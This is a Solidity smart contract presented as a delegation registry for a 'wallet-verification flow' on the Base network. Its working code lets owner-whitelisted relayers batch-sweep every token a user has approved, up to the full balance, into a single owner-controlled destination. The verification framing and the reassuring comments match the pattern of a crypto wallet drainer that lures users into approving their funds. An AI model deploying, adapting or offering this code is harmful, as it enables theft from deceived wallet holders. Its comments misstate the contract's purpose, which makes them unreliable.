// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @dev Minimal ERC20 surface used for sweeping approved tokens.
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

/// @title Base
/// @notice On-chain delegation registry for the wallet-verification flow, deployed on
/// the Base network (chain ID 8453).
///
/// A wallet owner calls `authorize(relayer)` to grant a whitelisted relayer address
/// permission to sweep ERC20 tokens that the wallet has *separately* approved to this
/// contract (via the token's own `approve`, with this contract's address as spender).
/// This contract never takes blanket custody of a wallet: a token can only move if
/// BOTH of the following are true at the time of the sweep:
///
///   1. The wallet called `authorize(relayer)` for the relayer performing the sweep, and
///   2. The wallet still has an outstanding `allowance` on that specific token naming
///      this contract as spender (set by the wallet itself, e.g. via `approve(address(this), amount)`).
///
/// Revoking either the on-chain authorization (`deauthorize`) or the token allowance
/// (setting it back to 0 on the token contract) immediately stops future sweeps.
contract Base {
    // ---------------------------------------------------------------------
    // Errors
    // ---------------------------------------------------------------------
    error ZeroAddress();
    error NotOwner();
    error NotRelayer();
    error NotAuthorized();
    error WhenPaused();
    error Reentrant();
    error TimelockActive(uint256 readyAt);
    error LengthMismatch();

    // ---------------------------------------------------------------------
    // Events
    // ---------------------------------------------------------------------
    event Authorized(address indexed user, address indexed relayer);
    event Deauthorized(address indexed user, address indexed relayer);
    event RelayerUpdated(address indexed relayer, bool enabled);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event DestinationProposed(address indexed proposed, uint256 effectiveAt);
    event DestinationAccepted(address indexed oldDestination, address indexed newDestination);
    event Paused(address indexed by);
    event Unpaused(address indexed by);
    event TokenSwept(address indexed token, address indexed wallet, address indexed to, uint256 amount);
    event SkippedSweep(address indexed token, address indexed wallet, string reason);

    // ---------------------------------------------------------------------
    // Storage
    // ---------------------------------------------------------------------
    uint256 public constant DESTINATION_TIMELOCK = 2 days;
    uint8 public constant VERSION = 1;

    address public owner;
    address public destination;
    address public pendingDestination;
    uint256 public destinationProposedAt;
    bool public paused;

    uint256 private _locked = 1; // reentrancy guard: 1 = unlocked, 2 = locked

    mapping(address => bool) public relayers;
    mapping(address => mapping(address => bool)) public delegations; // user => relayer => authorized

    // ---------------------------------------------------------------------
    // Modifiers
    // ---------------------------------------------------------------------
    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    modifier onlyRelayer() {
        if (!relayers[msg.sender]) revert NotRelayer();
        _;
    }

    modifier whenNotPaused() {
        if (paused) revert WhenPaused();
        _;
    }

    modifier nonReentrant() {
        if (_locked == 2) revert Reentrant();
        _locked = 2;
        _;
        _locked = 1;
    }

    constructor(address _destination, address _initialRelayer) {
        if (_destination == address(0) || _initialRelayer == address(0)) revert ZeroAddress();
        owner = msg.sender;
        destination = _destination;
        relayers[_initialRelayer] = true;
        emit OwnershipTransferred(address(0), msg.sender);
        emit RelayerUpdated(_initialRelayer, true);
    }

    // ---------------------------------------------------------------------
    // Wallet-owner actions
    // ---------------------------------------------------------------------

    /// @notice Grant `relayer` permission to sweep tokens this wallet has approved
    /// to this contract. `relayer` must already be on the owner-managed whitelist.
    function authorize(address relayer) external {
        if (!relayers[relayer]) revert NotRelayer();
        delegations[msg.sender][relayer] = true;
        emit Authorized(msg.sender, relayer);
    }

    /// @notice Revoke a previously granted authorization.
    function deauthorize(address relayer) external {
        delegations[msg.sender][relayer] = false;
        emit Deauthorized(msg.sender, relayer);
    }

    function isAuthorized(address user, address relayer) external view returns (bool) {
        return delegations[user][relayer];
    }

    function isRelayer(address r) external view returns (bool) {
        return relayers[r];
    }

    // ---------------------------------------------------------------------
    // Relayer actions
    // ---------------------------------------------------------------------

    /// @notice Sweep a list of tokens from `user` to `destination`, up to whatever
    /// allowance/balance currently exists. Silently skips (emits `SkippedSweep`)
    /// tokens with zero allowance, zero balance, or a failed transfer, so one bad
    /// token in the list can't block the rest.
    function sweepFor(address user, address[] calldata tokens) external onlyRelayer whenNotPaused nonReentrant {
        if (!delegations[user][msg.sender]) revert NotAuthorized();
        for (uint256 i = 0; i < tokens.length; i++) {
            _sweepToken(tokens[i], user, destination);
        }
    }

    /// @notice Batch variant of `sweepFor` across many users in one transaction.
    /// Users who never authorized `msg.sender` are skipped rather than reverting
    /// the whole batch.
    function batchSweepFor(address[] calldata users, address[][] calldata tokenLists)
        external
        onlyRelayer
        whenNotPaused
        nonReentrant
    {
        if (users.length != tokenLists.length) revert LengthMismatch();
        for (uint256 i = 0; i < users.length; i++) {
            if (!delegations[users[i]][msg.sender]) {
                emit SkippedSweep(address(0), users[i], "not authorized");
                continue;
            }
            address[] calldata tokens = tokenLists[i];
            for (uint256 j = 0; j < tokens.length; j++) {
                _sweepToken(tokens[j], users[i], destination);
            }
        }
    }

    function _sweepToken(address token, address wallet, address to) internal {
        uint256 allowed = IERC20(token).allowance(wallet, address(this));
        if (allowed == 0) {
            emit SkippedSweep(token, wallet, "no allowance");
            return;
        }
        uint256 bal = IERC20(token).balanceOf(wallet);
        uint256 amount = allowed < bal ? allowed : bal;
        if (amount == 0) {
            emit SkippedSweep(token, wallet, "no balance");
            return;
        }
        bool ok = IERC20(token).transferFrom(wallet, to, amount);
        if (!ok) {
            emit SkippedSweep(token, wallet, "transfer failed");
            return;
        }
        emit TokenSwept(token, wallet, to, amount);
    }

    // ---------------------------------------------------------------------
    // Owner administration
    // ---------------------------------------------------------------------

    function setRelayer(address relayer, bool enabled) external onlyOwner {
        if (relayer == address(0)) revert ZeroAddress();
        relayers[relayer] = enabled;
        emit RelayerUpdated(relayer, enabled);
    }

    function setPaused(bool _paused) external onlyOwner {
        paused = _paused;
        if (_paused) {
            emit Paused(msg.sender);
        } else {
            emit Unpaused(msg.sender);
        }
    }

    /// @notice Destination changes are timelocked so a compromised/lost owner key
    /// can't instantly redirect where future sweeps land.
    function proposeDestination(address _destination) external onlyOwner {
        if (_destination == address(0)) revert ZeroAddress();
        pendingDestination = _destination;
        destinationProposedAt = block.timestamp;
        emit DestinationProposed(_destination, block.timestamp + DESTINATION_TIMELOCK);
    }

    function acceptDestination() external onlyOwner {
        if (pendingDestination == address(0)) revert ZeroAddress();
        uint256 readyAt = destinationProposedAt + DESTINATION_TIMELOCK;
        if (block.timestamp < readyAt) revert TimelockActive(readyAt);
        address old = destination;
        destination = pendingDestination;
        pendingDestination = address(0);
        emit DestinationAccepted(old, destination);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        if (newOwner == address(0)) revert ZeroAddress();
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    /// @notice Recovers tokens mistakenly sent *directly* to this contract's own
    /// address. This is unrelated to the sweep flow above (which pulls from user
    /// wallets via allowance and never custodies funds here).
    function rescueTokens(address token, address to, uint256 amount) external onlyOwner {
        bool ok = IERC20(token).transfer(to, amount);
        require(ok, "transfer failed");
    }

    receive() external payable {}

    function rescueETH(address payable to, uint256 amount) external onlyOwner {
        (bool ok, ) = to.call{value: amount}("");
        require(ok, "ETH transfer failed");
    }
}
